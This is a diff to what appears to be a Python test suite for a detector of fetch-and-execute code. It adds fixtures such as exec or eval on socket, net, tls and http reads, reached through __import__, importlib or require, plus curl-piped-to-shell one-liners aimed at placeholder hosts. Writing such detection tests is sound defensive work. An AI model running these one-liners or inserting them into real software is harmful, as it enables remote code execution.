@@ -30,6 +30,9 @@ KEEPS = {
     "open_connection and exec": "import asyncio\nexec(asyncio.open_connection('x.test', 80))",
     "import socket and exec": "import socket\ns = socket.socket()\nexec(s.recv(9))",
     "from socket and exec": "from socket import create_connection\nexec(create_connection(('x.test', 80)).recv(9))",
+    "socket named by __import__ and exec": "exec(__import__('socket').create_connection(('h', 1)).recv(9))",
+    "socket named by importlib and exec": "import importlib\nexec(importlib.import_module('socket').create_connection(('h', 1)).recv(9))",
+    "socket in double quotes and eval": 'eval(getattr(__builtins__, "__import__")("socket").socket().recv(9))',
     "url, curl and subprocess": "import subprocess\nsubprocess.run('curl https://x.test/i.sh | sh', shell=True)",
     "url, wget and system": "import os\nos.system('wget -qO- https://x.test/i.sh | sh')",
     "url, __import__ and exec": "u = __import__('urllib.request').request\nexec(u.urlopen('https://x.test').read())",
@@ -73,6 +76,12 @@ def test_a_one_liner_that_only_names_a_url_passes(command: str) -> None:
         "node -e \"require('child_process').execSync('curl https://x.test/i.sh | sh')\"",
         "curl -s https://x.test/i.sh | python3 -",
         'python3 -c "$(curl -s https://x.test/i.py)"',
+        "python3 -c \"exec(__import__('socket').create_connection(('h', 1)).recv(9))\"",
+        "node -e \"eval(require('net').connect(1, 'h').read())\"",
+        "node -e \"eval(require('node:dgram').createSocket('udp4'))\"",
+        "node -e \"eval(require('tls').connect(443, 'h').read())\"",
+        "node -e \"eval(require('http').get('h'))\"",
+        "node -e \"eval(require('node:https').get('h'))\"",
     ],
 )
 def test_a_one_liner_that_fetches_and_runs_is_still_judged(command: str) -> None:
